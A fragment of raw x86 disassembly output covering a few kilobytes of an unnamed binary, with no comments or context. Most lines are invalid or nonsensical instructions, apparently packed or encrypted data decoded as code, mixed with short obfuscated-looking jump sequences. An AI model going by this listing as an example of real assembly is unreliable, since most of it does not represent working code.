  4195ea:	push   ebx
  4195eb:	or     ebx,edx
  4195ed:	mov    dx,0xddc1
  4195f1:	xlat   BYTE PTR ds:[ebx]
  4195f2:	into   
  4195f3:	stos   DWORD PTR es:[edi],eax
  4195f4:	es call 0x198:0xa93da3dd
  4195fc:	cmp    al,BYTE PTR [edi]
  4195fe:	in     eax,0x44
  419600:	sbb    BYTE PTR [esi-0x52],dl
  419603:	push   es
  419604:	rol    BYTE PTR [esi-0x38],1
  419607:	mov    bh,0x75
  419609:	inc    ecx
  41960a:	es and al,0x5
  41960d:	and    DWORD PTR [ebp+ebp*1-0x339e085c],ecx
  419614:	push   es
  419615:	dec    ebp
  419616:	icebp  
  419617:	retf   0xd875
  41961a:	out    dx,al
  41961b:	shr    DWORD PTR [edi],cl
  41961d:	mov    BYTE PTR [esi],ch
  41961f:	aad    0x1a
  419621:	jnp    0x4195b5
  419623:	stos   DWORD PTR es:[edi],eax
  419624:	xor    DWORD PTR [esi],esi
  419626:	fcomp  DWORD PTR [edi-0xb18b0a8]
  41962c:	jae    0x4195b9
  41962e:	and    bl,BYTE PTR [esi+0x0]
  419631:	fbstp  TBYTE PTR [ebx-0x414e0ab5]
  419637:	mov    edi,eax
  419639:	test   bh,dh
  41963b:	push   es
  41963c:	xor    BYTE PTR [eax+0x14],bh
  41963f:	pop    ebp
  419640:	fistp  WORD PTR [ecx]
  419642:	mov    ss,WORD PTR [eax+ecx*8-0x5a]
  419646:	lds    ecx,FWORD PTR [edx]
  419648:	adc    eax,0xb878747c
  41964d:	xchg   esi,eax
  41964e:	pop    es
  41964f:	loop   0x419621
  419651:	pop    ebx
  419652:	jmp    FWORD PTR [ebx+0x6]
  419655:	mov    dl,0x66
  419657:	or     ecx,edx
  419659:	mov    edx,0x21a4
  41965e:	or     cx,dx
  419661:	mov    dx,WORD PTR [esp+0x2c]
  419666:	sub    cx,dx
  419669:	mov    dx,WORD PTR [esp+0x38]
  41966e:	sub    cx,dx
  419671:	mov    dx,WORD PTR [esp+0x3c]
  419676:	cmp    dx,cx
  419679:	jbe    0x41a320
  41967f:	mov    ecx,0x5008
  419684:	jmp    0x4198e1
  419689:	xchg   ebx,eax
  41968a:	sub    al,0x3f
  41968c:	jae    0x419706
  41968e:	mov    esp,0x77bf2cb3
  419693:	jo     0x419672
  419695:	(bad)  
  419696:	fcom   DWORD PTR [esi+ebx*4]
  419699:	stos   DWORD PTR es:[edi],eax
  41969a:	or     eax,eax
  41969c:	mov    esi,0xbebec235
  4196a1:	rcl    BYTE PTR [edx],1
  4196a3:	adc    cl,BYTE PTR [ebx+0x2a62fc15]
  4196a9:	mov    BYTE PTR [esi-0x60c9789f],0x92
  4196b0:	inc    eax
  4196b1:	xchg   ebx,eax
  4196b2:	dec    edi
  4196b3:	(bad)
  4196b6:	push   ss
  4196b7:	mov    ah,BYTE PTR [edx+0x7fa27930]
  4196bd:	push   eax
  4196be:	cwde   
  4196bf:	enter  0xea69,0x6e
  4196c3:	pop    esi
  4196c4:	mov    eax,ebx
  4196c6:	mov    ebx,0xf8b623a3
  4196cb:	pop    ebx
  4196cc:	aas    
  4196cd:	xchg   esp,eax
  4196ce:	retf   
  4196cf:	push   ss
  4196d0:	mov    ebp,0x97bc7f39
  4196d5:	add    ah,BYTE PTR [eax+0x592d49b9]
  4196db:	dec    ebx
  4196dc:	shl    DWORD PTR [esi],1
  4196de:	pushf  
  4196df:	(bad)  
  4196e0:	jne    0x4196a5
  4196e2:	fcmovne st,st(1)
  4196e4:	sti    
  4196e5:	adc    al,0x3c
  4196e7:	(bad)  
  4196e8:	gs mov bl,0x54
  4196eb:	in     al,0x14
  4196ed:	(bad)  
  4196ee:	aam    0x83
  4196f0:	imul   BYTE PTR [ebp-0x389d54d7]
  4196f6:	xchg   ecx,eax
  4196f7:	ss ror ah,cl
  4196fa:	inc    esp
  4196fb:	sbb    al,0x69
  4196fd:	and    DWORD PTR [ebp-0x5b8b238f],esi
  419703:	in     al,0xdb
  419705:	cmp    DWORD PTR gs:[eax+eiz*4+0x8],ebp
  41970a:	test   eax,0x9f43be8a
  41970f:	add    edi,DWORD PTR [ebp-0x6605d00f]
  419715:	js     0x4196f3
  419717:	jmp    0x6e9f8798
  41971c:	inc    ebp
  41971d:	jb     0x41977a
  41971f:	loope  0x41974c
  419721:	addr16 sti 
  419723:	mov    DWORD PTR [eax],esp
  419725:	and    eax,ebp
  419727:	mov    eax,0x3f9ec95e
  41972c:	icebp  
  41972d:	dec    eax
  41972e:	or     al,0xf8
  419730:	xchg   esi,eax
  419731:	fnsave [edx-0x7f8d65ea]
  419737:	pop    ds
  419738:	xchg   ebp,eax
  419739:	or     al,0xea
  41973b:	jl     0x419700
  41973d:	dec    ebx
  41973e:	adc    eax,0xb105d62c
  419743:	xor    al,0x87
  419745:	sub    ch,dh
  419747:	lods   eax,DWORD PTR ds:[esi]
  419748:	cmp    eax,0x7e670737
  41974d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41974e:	test   eax,0x8040a26d
  419753:	mov    ah,0x9d
  419755:	iret   
  419756:	test   BYTE PTR [edi],0x9c
  419759:	push   0xffffffb5
  41975b:	out    0xb8,eax
  41975d:	jno    0x419743
  41975f:	lods   eax,DWORD PTR ds:[esi]
  419760:	fld    TBYTE PTR [esi-0x679e6964]
  419766:	adc    cl,al
  419768:	cmp    bh,bl
  41976a:	hlt    
  41976b:	pop    edx
  41976c:	js     0x41976d
  41976e:	mov    ds:0x8ccff70f,al
  419773:	and    dl,bl
  419775:	mov    al,BYTE PTR [ecx]
  419777:	and    BYTE PTR [ecx],dl
  419779:	dec    esp
  41977a:	lahf   
  41977b:	sbb    BYTE PTR [ecx+0x32],ch
  41977e:	adc    eax,0x864a33d2
  419783:	adc    eax,0x9fa76a3c
  419788:	rol    BYTE PTR [edi-0x595cfc4c],1
  41978e:	add    ch,dl
  419790:	je     0x4197ab
  419792:	ret    0xe15c
  419795:	pop    edi
  419796:	stos   BYTE PTR es:[edi],al
  419797:	mov    eax,ds:0xe2548a1a
  41979c:	lahf   
  41979d:	push   ecx
  41979e:	fisubr DWORD PTR [ebp+0x2a]
  4197a1:	in     eax,dx
  4197a2:	xchg   ebx,eax
  4197a3:	stc    
  4197a4:	mov    ah,0x29
  4197a6:	inc    edx
  4197a7:	dec    esp
  4197a8:	jl     0x419749
  4197aa:	xchg   esp,eax
  4197ab:	jle    0x419746
  4197ad:	adc    al,0x68
  4197af:	fisub  WORD PTR [edi+0x4c608b4b]
  4197b5:	sub    DWORD PTR [edx-0x7e],edi
  4197b8:	jno    0x41979c
  4197ba:	ret    0x67c0
  4197bd:	xchg   ecx,eax
  4197be:	inc    edx
  4197bf:	inc    ebx
  4197c0:	std    
  4197c1:	adc    dl,bh
  4197c3:	(bad)  
  4197c4:	pushf  
  4197c5:	aam    0xa9
  4197c7:	jo     0x419775
  4197c9:	pop    edx
  4197ca:	das    
  4197cb:	pop    ecx
  4197cc:	leave  
  4197cd:	dec    edx
  4197ce:	xchg   BYTE PTR [ebp+0x1120533c],dl
  4197d4:	push   esp
  4197d5:	jmp    0x41977c
  4197d7:	shr    BYTE PTR es:[esi],0x1a
  4197db:	out    0xe,al
  4197dd:	jb     0x41983e
  4197df:	or     DWORD PTR [edx-0x5],ebx
  4197e2:	jg     0x4197fd
  4197e4:	and    eax,0xd5e986b2
  4197e9:	iret   
  4197ea:	(bad)  
  4197eb:	xchg   edi,eax
  4197ec:	(bad)  
  4197ed:	jno    0x4197a6
  4197ef:	sbb    eax,esi
  4197f1:	xchg   BYTE PTR [edi+0x426dc7d7],ch
  4197f7:	inc    eax
  4197f8:	loope  0x419800
  4197fa:	pop    ss
  4197fb:	jne    0x419799
  4197fd:	ds cs mov cl,0xc9
  419801:	push   esi
  419802:	bound  esp,QWORD PTR [esi]
  419804:	shl    BYTE PTR [edx-0x13],0xb
  419808:	xchg   DWORD PTR [ebp-0x43],eax
  41980b:	sbb    BYTE PTR [esi],cl
  41980d:	(bad)  
  41980e:	mov    ebx,0x2fbef616
  419813:	or     ch,BYTE PTR [esi-0x14]
  419816:	xchg   ebp,eax
  419817:	sahf   
  419818:	mov    ebx,0xfa1e4a2f
  41981d:	enter  0xc416,0xf5
  419821:	mov    eax,ds:0x36fbfecf
  419826:	cmc    
  419827:	repnz adc dl,BYTE PTR [edx+0x5521d57e]
  41982e:	lock adc DWORD PTR [eax],edi
  419831:	nop
  419832:	mov    bh,0x5b
  419834:	jne    0x4197c0
  419836:	sub    al,0x3c
  419838:	push   di
  41983a:	in     eax,0x17
  41983c:	pop    esi
  41983d:	test   al,0x25
  41983f:	mov    cl,BYTE PTR [esi-0x7c]
  419842:	imul   ebp
  419844:	and    BYTE PTR [edx],0x86
  419847:	mov    bl,BYTE PTR ds:0x30b2bbb7
  41984d:	mov    al,ds:0x7ee7902a
  419852:	jns    0x419821
  419854:	and    BYTE PTR [edx+0x5],dl
  419857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419858:	mov    ds:0xdcd2fd68,eax
  41985d:	mov    ?,WORD PTR [esi]
  41985f:	pop    ebx
  419860:	and    BYTE PTR [edi-0x276dcba5],ah
  419866:	mov    ecx,0x780448de
  41986b:	xor    eax,0xd300c93c
  419870:	(bad)  
  419871:	lds    edi,FWORD PTR [edi-0x440eb19a]
  419877:	nop
  419878:	push   edi
  419879:	sbb    al,0xac
  41987b:	sub    edi,DWORD PTR [ebx-0x39]
  41987e:	fisubr DWORD PTR [ebx]
  419880:	xchg   ecx,eax
  419881:	jno    0x419896
  419883:	div    esp
  419885:	inc    ebp
  419886:	test   al,0x43
  419888:	addr16 dec edx
  41988a:	loopne 0x41982b
  41988c:	and    eax,0x6ce20d37
  419891:	xor    BYTE PTR [edi],bl
  419893:	adc    BYTE PTR [ebx-0x435ea4ca],dh
  419899:	mov    edi,DWORD PTR [ebp+edx*4-0xc]
  41989d:	push   es
  41989e:	leave  
  41989f:	mov    ebp,0x14ec97bf
  4198a4:	lahf   
  4198a5:	fsubr  st(5),st
  4198a7:	lods   al,BYTE PTR ds:[esi]
  4198a8:	or     eax,0xc08ff0b4
  4198ad:	push   edx
  4198ae:	mov    esp,0x1ce16338
  4198b3:	and    ah,BYTE PTR [edx+edi*2+0x16f4ce60]
  4198ba:	inc    dx
  4198bc:	shl    DWORD PTR [eax],0x5f
  4198bf:	ret    
  4198c0:	pop    esp
  4198c1:	jns    0x4198b5
  4198c3:	ss gs aaa 
  4198c6:	cli    
  4198c7:	xchg   esi,eax
  4198c8:	mul    DWORD PTR [esi-0x59cfa410]
  4198ce:	mov    edx,0x5205ae6a
  4198d3:	stos   BYTE PTR es:[edi],al
  4198d4:	int3   
  4198d5:	addr16 xchg esi,eax
  4198d7:	push   edi
  4198d8:	cdq    
  4198d9:	xchg   ecx,eax
  4198da:	jg     0x419929
  4198dc:	lods   al,BYTE PTR ds:[esi]
  4198dd:	iret   
  4198de:	pop    ds
  4198df:	mov    ecx,0x4c896635
  4198e4:	and    al,0x24
  4198e6:	mov    ecx,0x60ce
  4198eb:	mov    WORD PTR [esp+0xc],cx
  4198f0:	movzx  ecx,WORD PTR [esp+0xc]
  4198f5:	mov    edx,0x2095
  4198fa:	or     cx,dx
  4198fd:	mov    dx,WORD PTR [esp+0x24]
  419902:	sub    cx,dx
  419905:	jmp    0x419b62
  41990a:	loop   0x419959
  41990c:	push   eax
  41990d:	xchg   ebx,eax
  41990e:	je     0x4198a4
  419910:	and    ch,BYTE PTR [edi-0x307dfe70]
  419916:	mov    cl,0x6f
  419918:	aad    0xe3
  41991a:	and    al,0xd
  41991c:	sar    BYTE PTR [esi-0x41413dcb],0x45
  419923:	mov    dl,0x2b
  419925:	xchg   esp,eax
  419926:	mov    bl,0x43
  419928:	shr    BYTE PTR [edx],cl
  41992a:	jp     0x4198ca
  41992c:	lahf   
  41992d:	adc    al,0x61
  41992f:	clc    
  419930:	je     0x4198fa
  419932:	lods   al,BYTE PTR ds:[esi]
  419933:	mov    dh,0xa6
  419935:	test   al,0x66
  419937:	sbb    dl,BYTE PTR [esi+0xad4a2f1]
  41993d:	call   FWORD PTR [ebx]
  41993f:	mov    eax,0xbb3e1ad4
  419944:	addr16 (bad) 
  419946:	js     0x419983
  419948:	(bad)  
  419949:	xchg   ecx,eax
  41994a:	icebp  
  41994b:	cmc    
  41994c:	xchg   ebp,eax
  41994d:	lock scas eax,DWORD PTR es:[edi]
  41994f:	xchg   esp,eax
  419950:	in     eax,0x5b
  419952:	sub    al,0x23
  419954:	inc    ebp
  419955:	jge    0x41998e
  419957:	mov    cl,0x2a
  419959:	fcomp  st(5)
  41995b:	cmc    
  41995c:	cmp    eax,0xd76abb68
  419961:	ret    
  419962:	push   ebx
  419963:	mov    bh,0xeb
  419965:	sub    BYTE PTR [eax-0x7f510b39],0x3a
  41996c:	mov    ebx,0xb3114073
  419971:	jp     0x419919
  419973:	test   BYTE PTR [ebx-0x3f877f14],bh
  419979:	jge    0x4198fc
  41997b:	stc    
  41997c:	sbb    eax,0xf20b1c45
  419981:	inc    esi
  419982:	cmp    dx,WORD PTR [ecx-0x55f2a5ba]
  419989:	push   esp
  41998a:	ror    BYTE PTR [ebx],1
  41998c:	cwde   
  41998d:	cli    
  41998e:	mov    dh,BYTE PTR [ebx+0x1cd2cdfc]
  419994:	push   ds
  419995:	sbb    eax,0xad5763d8
  41999a:	mov    al,0x5e
  41999c:	mov    al,0xbc
  41999e:	rol    BYTE PTR [ecx-0x1849850f],cl
  4199a4:	les    eax,FWORD PTR [edi+0x26]
  4199a7:	ret    
  4199a8:	stos   DWORD PTR es:[edi],eax
  4199a9:	jge    0x41997e
  4199ab:	mov    bh,0x1d
  4199ad:	pop    ss
  4199ae:	sub    ecx,DWORD PTR [ecx]
  4199b0:	dec    ebp
  4199b1:	addr16 mov ebp,0xd6dc9b41
  4199b7:	jno    0x419a12
  4199b9:	add    al,al
  4199bb:	sub    BYTE PTR [ebp+edi*8+0x21940df4],bh
  4199c2:	mov    bh,0xf7
  4199c4:	in     al,0x14
  4199c6:	sbb    al,0x36
  4199c8:	ror    BYTE PTR [edx],1
  4199ca:	in     eax,0xc9
  4199cc:	enter  0xfe20,0xc
  4199d0:	cwde   
  4199d1:	jnp    0x419998
  4199d3:	das    
  4199d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199d5:	add    BYTE PTR [esi],0x9d
  4199d8:	fst    QWORD PTR [esi]
  4199da:	xchg   edi,eax
  4199db:	mov    ebp,0x607f9204
  4199e0:	or     bl,BYTE PTR [edi]
  4199e2:	add    dh,BYTE PTR [ebx]
  4199e4:	xor    eax,0x10d23f32
  4199e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ea:	dec    esp
  4199eb:	mov    dh,0x1b
  4199ed:	sub    al,bl
  4199ef:	mov    ecx,0x27a9e82d
  4199f4:	xor    DWORD PTR [ebx+0x12],edx
  4199f7:	and    BYTE PTR [ecx-0x58],ah
  4199fa:	xchg   esi,eax
  4199fb:	(bad)  
  4199fc:	lock lods eax,DWORD PTR ds:[esi]
  4199fe:	mov    cl,0x17
  419a00:	adc    ebp,DWORD PTR [eax+0x4c809177]
  419a06:	or     al,0xc
  419a08:	iret   
  419a09:	add    bh,BYTE PTR [edx]
  419a0b:	cli    
  419a0c:	ficomp DWORD PTR [ebx+0xb63ac89]
  419a12:	jg     0x419a73
  419a14:	and    DWORD PTR [edi-0x55],edi
  419a17:	xchg   edx,eax
  419a18:	push   esi
  419a19:	popf   
  419a1a:	gs mov ah,0x45
  419a1d:	lds    ecx,FWORD PTR [ecx-0x56]
  419a20:	shl    BYTE PTR [bx+di+0x53bc],0x19
  419a26:	test   BYTE PTR [esi+0x50217923],bl
  419a2c:	pusha  
  419a2d:	push   ss
  419a2e:	daa    
  419a2f:	test   dl,cl
  419a31:	mov    eax,ds:0x4e1ffc36
  419a36:	xchg   ecx,esp
  419a38:	popf   
  419a39:	and    eax,0xf2996171
  419a3e:	aaa    
  419a3f:	jmp    0x3288:0xd71c5e00
  419a46:	nop
  419a47:	mov    esi,0xa7e6825f
  419a4c:	scas   al,BYTE PTR es:[edi]
  419a4d:	inc    cl
  419a4f:	stos   BYTE PTR es:[edi],al
  419a50:	xlat   BYTE PTR ds:[ebx]
  419a51:	sub    dl,bl
  419a53:	scas   eax,DWORD PTR es:[edi]
  419a54:	pusha  
  419a55:	pushf  
  419a56:	jmp    0x419a8e
  419a58:	mov    esp,0x7f9b45c5
  419a5d:	push   ebx
  419a5e:	(bad)  
  419a5f:	stc    
  419a60:	add    DWORD PTR ds:0x1f3dc09c,edi
  419a66:	bound  edi,QWORD PTR [edx+0x1e]
  419a69:	ss jmp 0x7912:0xf68ec125
  419a71:	retf   
  419a72:	imul   eax,DWORD PTR [ebx-0x7deb2880],0xffffffc1
  419a79:	loope  0x419a27
  419a7b:	inc    ebx
  419a7c:	push   ds
  419a7d:	jge    0x419a37
  419a7f:	xor    eax,0xdd14fa87
  419a84:	xchg   BYTE PTR ds:0x3bd9a867,bh
  419a8a:	pusha  
  419a8b:	cmp    esi,DWORD PTR [ebx+0x5b]
  419a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a8f:	mov    bh,0x52
  419a92:	rcr    DWORD PTR [edi-0x7385c388],0x46
  419a99:	push   cs
  419a9a:	in     eax,dx
  419a9b:	jle    0x419af9
  419a9d:	xchg   edi,eax
  419a9e:	fistp  WORD PTR [esi]
  419aa0:	out    dx,eax
  419aa1:	push   edx
  419aa2:	fwait
  419aa3:	xchg   ebp,eax
  419aa4:	push   edi
  419aa5:	out    0x34,al
  419aa7:	cmp    DWORD PTR [eax],ecx
  419aa9:	pop    edx
  419aaa:	add    eax,0x3daec02f
  419aaf:	fs cs dec ecx
  419ab2:	sub    al,al
  419ab4:	pop    edx
  419ab5:	shl    BYTE PTR [ebp+0x322453e3],0xe7
  419abc:	lea    ebx,[edx-0x71a1a5be]
  419ac2:	mov    ds:0xc80667ad,al
  419ac7:	mov    WORD PTR [edx+0x6d5f3b9a],ss
  419acd:	outs   dx,BYTE PTR ds:[esi]
  419ace:	sub    BYTE PTR [ebp+0x2b],dh
  419ad1:	out    0x63,al
  419ad3:	fldenv [ebp-0x7d]
  419ad6:	test   eax,0x3aac81e2
  419adb:	int3   
  419adc:	idiv   ebx
  419ade:	retf   0x6876
  419ae1:	push   esp
  419ae2:	and    DWORD PTR [ecx-0x5a8e356c],ecx
  419ae8:	js     0x419a8d
  419aea:	(bad)  
  419aeb:	lds    eax,FWORD PTR [edi-0xa4ae006]
  419af1:	je     0x419a96
  419af3:	push   esp
  419af4:	out    dx,al
  419af5:	jbe    0x419a95
  419af7:	mov    edx,ds
  419af9:	adc    BYTE PTR [esi],0xa3
  419afc:	imul   esi,DWORD PTR ds:0x82d41965,0x6c0698ce
  419b06:	int3   
  419b07:	xchg   edi,eax
  419b08:	or     BYTE PTR [esi-0x1aaa94fd],dl
  419b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b0f:	jb     0x419b52
  419b11:	mov    ds:0x5bed8572,eax
  419b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b17:	add    esp,DWORD PTR [ecx-0x5b]
  419b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b1b:	pop    ebp
  419b1c:	test   BYTE PTR [esp+eax*8-0x69],dl
  419b20:	dec    esi
  419b21:	aaa    
  419b22:	test   DWORD PTR ds:0x1436cf4e,ecx
  419b28:	lds    esi,FWORD PTR [edi-0x206a1b6]
  419b2e:	cdq    
  419b2f:	jg     0x419b8b
  419b31:	ja     0x419b5d
  419b33:	jle    0x419b5e
  419b35:	dec    ebp
  419b36:	(bad)  
  419b37:	mul    BYTE PTR ds:0x89f1d840
  419b3d:	xor    eax,0x9a649f33
  419b42:	sti    
  419b43:	jbe    0x419ac6
  419b45:	jns    0x419b6f
  419b47:	clc    
  419b48:	pop    ds
  419b49:	dec    esp
  419b4a:	add    eax,0x5e944ff
  419b4f:	mov    ecx,0x4ad02fb7
  419b54:	call   0x5e836089
  419b59:	jae    0x419b0a
  419b5b:	pop    edi
  419b5c:	push   0x943a8674
  419b61:	add    edi,DWORD PTR [edx+0x10de]
  419b67:	or     ecx,0x742f
  419b6d:	imul   ecx,ecx,0x30b2
  419b73:	mov    WORD PTR [esp+0x3c],cx
  419b78:	mov    ecx,0x6143
  419b7d:	mov    WORD PTR [esp+0x38],cx
  419b82:	mov    ecx,0x679f
  419b87:	mov    WORD PTR [esp+0x2c],cx
  419b8c:	mov    ecx,0x1210
  419b91:	mov    WORD PTR [esp+0x24],cx
  419b96:	mov    ecx,0x3308
  419b9b:	mov    WORD PTR [esp+0xc],cx
  419ba0:	mov    cx,WORD PTR [esp+0xc]
  419ba5:	sub    cx,dx
  419ba8:	jmp    0x419e05
  419bad:	jge    0x419b6c
  419baf:	into   
  419bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb1:	mov    ?,WORD PTR [esp+esi*4-0x51b6fd1d]
  419bb8:	iret   
  419bb9:	add    ah,BYTE PTR [ebx-0x46]
  419bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bbd:	pushf  
  419bbe:	adc    eax,eax
  419bc0:	mov    esi,0xbebec235
  419bc5:	pop    es
  419bc6:	pusha  
  419bc7:	mov    esp,0xe43e8291
  419bcc:	add    esi,DWORD PTR [ebx-0x5e]
  419bcf:	iret   
  419bd0:	pop    es
  419bd1:	push   ebp
  419bd2:	out    0xe8,eax
  419bd4:	adc    DWORD PTR [ebx-0x55],ecx
  419bd7:	arpl   WORD PTR [ebp-0xc9ca2f2],si
  419bdd:	(bad)  
  419bde:	jle    0x419b8c
  419be0:	xor    ebp,DWORD PTR [esi+eax*4]
  419be3:	in     eax,0x78
  419be5:	push   edi
  419be6:	shl    DWORD PTR [ecx+0x47f26e23],1
  419bec:	cmp    ah,BYTE PTR [edi]
  419bee:	push   ebx
  419bef:	mov    WORD PTR [edi+0x76],es
  419bf2:	jp     0x419ba8
  419bf4:	retf   0x92c7
  419bf7:	out    0x9,al
  419bf9:	lea    edi,[ebp-0x1c854358]
  419bff:	mov    ds:0x60e7d1af,eax
  419c04:	iret   
  419c05:	adc    eax,0x1dbd3558
  419c0a:	mov    ecx,0xf5f833cd
  419c0f:	pop    ebp
  419c10:	xchg   esp,eax
  419c11:	xchg   esp,eax
  419c12:	push   ds
  419c13:	xchg   edi,eax
  419c14:	pop    es
  419c15:	inc    eax
  419c16:	ss xor ah,bl
  419c19:	stos   DWORD PTR es:[edi],eax
  419c1a:	xor    BYTE PTR [edx],bl
  419c1c:	mov    ebx,0x279a71aa
  419c21:	inc    esi
  419c22:	(bad)  
  419c23:	aad    0x7e
  419c25:	leave  
  419c26:	or     ah,BYTE PTR [edx]
  419c28:	lahf   
  419c29:	ja     0x419c4b
  419c2b:	sub    dh,ah
  419c2d:	push   ss
  419c2e:	mov    dh,al
  419c30:	es ds daa 
  419c33:	loopne 0x419be8
  419c35:	inc    ebx
  419c36:	int3   
  419c37:	cmc    
  419c38:	xor    cl,al
  419c3a:	loopne 0x419bf7
  419c3c:	dec    ebp
  419c3d:	sahf   
  419c3e:	fcom   QWORD PTR ds:0x4722195f
  419c44:	dec    eax
  419c45:	xchg   ecx,eax
  419c46:	into   
  419c47:	out    0x8e,al
  419c49:	add    al,0x2b
  419c4b:	sbb    al,0x65
  419c4d:	dec    edx
  419c4e:	inc    edi
  419c4f:	push   ss
  419c50:	mov    ebp,0x6a6f9238
  419c55:	xor    DWORD PTR [ebx+0x2],ecx
  419c58:	stos   DWORD PTR es:[edi],eax
  419c59:	inc    esi
  419c5a:	adc    eax,0x4bae0f51
  419c5f:	mov    DWORD PTR [ebp-0x628bbb43],0x364ba9e1
  419c69:	ins    DWORD PTR es:[edi],dx
  419c6a:	mov    ch,bh
  419c6c:	adc    bh,ah
  419c6e:	add    DWORD PTR [esi],esp
  419c70:	mov    WORD PTR [ecx],ss
  419c72:	xchg   esi,eax
  419c73:	adc    eax,0x85b16add
  419c78:	mov    cl,0x88
  419c7a:	sahf   
  419c7b:	cwde   
  419c7c:	mov    bh,0xff
  419c7e:	xor    eax,0xb9b88ca0
  419c83:	sar    bl,1
  419c85:	inc    esp
  419c86:	std    
  419c87:	sahf   
  419c88:	(bad)  
  419c89:	repz in eax,0x3
  419c8c:	or     BYTE PTR [ecx+eiz*4-0x77],ch
  419c90:	rol    BYTE PTR [esi-0x208861a7],0x96
  419c97:	dec    ebp
  419c98:	sar    DWORD PTR [ebx+ecx*1-0x1a66f594],0x7a
  419ca0:	mov    al,0xac
  419ca2:	cmp    BYTE PTR [eax+0x277ae4d5],dh
  419ca8:	and    al,0x17
  419caa:	div    BYTE PTR [edi]
  419cac:	jns    0x419d27
  419cae:	inc    ebx
  419caf:	js     0x419c5a
  419cb1:	std    
  419cb2:	mov    cl,0x23
  419cb4:	lods   eax,DWORD PTR ds:[si]
  419cb6:	stos   DWORD PTR es:[edi],eax
  419cb7:	sbb    BYTE PTR [eax+0x1fd164f6],0xbc
  419cbe:	inc    ecx
  419cbf:	mov    cl,0xda
  419cc1:	outs   dx,BYTE PTR ds:[esi]
  419cc2:	mov    cl,bh
  419cc4:	cs push edi
  419cc6:	add    DWORD PTR [edx+ebp*4+0x6f],ebp
  419cca:	iret   
  419ccb:	enter  0x2947,0x84
  419ccf:	adc    DWORD PTR [ebp+0x30],0x7e
  419cd3:	jp     0x419cdb
  419cd5:	out    dx,al
  419cd6:	rcr    BYTE PTR [edi+0x4b],cl
  419cd9:	and    dh,BYTE PTR [ecx]
  419cdb:	jno    0x419c9b
  419cdd:	jae    0x419c71
  419cdf:	or     DWORD PTR [esi+ebp*2],edx
  419ce2:	adc    dh,BYTE PTR [ebx+ebp*8+0x2e]
  419ce6:	rcr    BYTE PTR [ebp-0x67],1
  419ce9:	cmp    eax,0x1ec65a3c
  419cee:	iret   
  419cef:	mov    ebx,DWORD PTR [esi]
  419cf1:	dec    eax
  419cf2:	push   cs
  419cf3:	dec    edi
  419cf4:	pop    eax
  419cf5:	cwde   
  419cf6:	xchg   ecx,eax
  419cf7:	test   BYTE PTR [edi-0x76],dh
  419cfa:	icebp  
  419cfb:	imul   BYTE PTR [ebx+eax*4+0x4a56da5f]
  419d02:	icebp  
  419d03:	mov    bl,0x5d
  419d05:	mov    ds:0xc16ccbfa,eax
  419d0a:	push   0xffffffb7
  419d0c:	loop   0x419caf
  419d0e:	test   al,0x3c
  419d10:	xchg   edx,eax
  419d11:	ss and eax,0x464f745c
  419d17:	(bad)  
  419d18:	sbb    BYTE PTR [eax-0x1b16fcb9],ah
  419d1e:	jns    0x419d74
  419d20:	fstp   st(0)
  419d22:	push   ecx
  419d23:	adc    esi,DWORD PTR [edx+ebp*2]
  419d26:	(bad)  
  419d27:	shl    al,1
  419d29:	mov    BYTE PTR [edx-0x80],bh
  419d2c:	out    0xcb,eax
  419d2e:	add    DWORD PTR ds:0xc7660259,esi
  419d34:	or     al,0xbf
  419d36:	js     0x419d3c
  419d38:	xchg   ah,bh
  419d3a:	es mov ah,0xd1
  419d3d:	jg     0x419dbd
  419d3f:	in     eax,dx
  419d40:	inc    edi
  419d41:	shr    BYTE PTR [eax+0x52],1
  419d44:	loopne 0x419ce0
  419d46:	arpl   di,bx
  419d48:	mov    ecx,0x19b409ef
  419d4d:	inc    eax
  419d4e:	mov    ecx,es
  419d50:	or     BYTE PTR [esi+0x3f8cf873],dl
  419d56:	ret    
  419d57:	aad    0x4b
  419d59:	jmp    0x419d37
  419d5b:	mov    ds:0x7511a11f,al
  419d60:	jmp    0x7420:0xf593d12d
  419d67:	les    edi,FWORD PTR [edx+0x79]
  419d6a:	call   0xe544f51d
  419d6f:	sbb    al,0x86
  419d71:	mov    bl,0xaf
  419d73:	shl    DWORD PTR ds:0xdfe004e3,0x64
  419d7a:	sbb    DWORD PTR [esi+0x71ad6aa1],ebp
  419d80:	icebp  
  419d81:	das    
  419d82:	mov    ds:0x22a8bfd4,al
  419d87:	or     BYTE PTR [edi+eiz*8+0x4c],0xf6
  419d8c:	ficom  DWORD PTR [eax]
  419d8e:	shl    DWORD PTR [edx],cl
  419d90:	and    eax,0x3ad44dc2
  419d95:	iret   
  419d96:	ret    
  419d97:	pop    edi
  419d98:	pop    ebx
  419d99:	dec    ebp
  419d9a:	inc    esi
  419d9b:	jp     0x419def
  419d9d:	mov    ecx,0xf4045531
  419da2:	imul   edi,DWORD PTR [esi],0xffffffee
  419da5:	ds leave 
  419da7:	ds nop
  419da9:	pop    edx
  419daa:	mov    esi,DWORD PTR [eax+0x5a]
  419dad:	push   eax
  419dae:	xchg   esp,eax
  419daf:	bound  edi,QWORD PTR [ebp-0x2519617c]
  419db5:	and    BYTE PTR [ecx-0x31508663],ch
  419dbb:	mov    edx,0xd37c3c3b
  419dc0:	enter  0x45a4,0x74
  419dc4:	nop
  419dc5:	inc    ebx
  419dc6:	ret    
  419dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dc8:	push   eax
  419dc9:	and    ebp,DWORD PTR [edi+edx*2-0x18]
  419dcd:	shr    BYTE PTR [eax+0x5fee10ef],0x92
  419dd4:	out    dx,al
  419dd5:	cld    
  419dd6:	mov    DWORD PTR [esi],0x8ec858cc
  419ddc:	icebp  
  419ddd:	mov    WORD PTR [eax+0x14d83b67],?
  419de3:	(bad)  
  419de4:	(bad)  
  419de5:	jle    0x419d7d
  419de7:	sub    DWORD PTR [esp+ecx*2-0x54],esi
  419deb:	pop    ss
  419dec:	cdq    
  419ded:	fcmovbe st,st(6)
  419def:	mov    ch,dl
